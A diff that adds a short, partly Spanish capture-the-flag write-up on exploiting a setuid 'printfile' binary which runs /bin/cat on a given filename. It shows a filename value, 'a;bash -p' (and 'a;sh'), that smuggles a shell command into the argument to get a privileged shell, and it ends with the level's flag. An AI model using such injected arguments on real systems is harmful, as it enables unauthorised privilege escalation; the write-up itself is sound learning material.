@@ -1,0 +1,23 @@
+
+
+This one was very good, and i did not know how to exploit the binary, so i had to look it up :(
+
+I'll explain
+	
+	They gives us a sutUID binary which prints the context of a filename
+		the binary makes a syscall at /bin/cat to print the context,
+		  but hence we can take advantage of that we can specify a file
+			without things inside followed by an AND logic gate and a command
+
+
+	1) touch "a;bash -p"
+		-> -p para que atienda al setuid del owner
+	
+	2) ./printfile "a;bash -p"
+		-> meme: *"we're in"*
+
+	We can spawn a shell this way also:
+
+		-> "a;sh"
+
+flag: Ahdiemoo1j
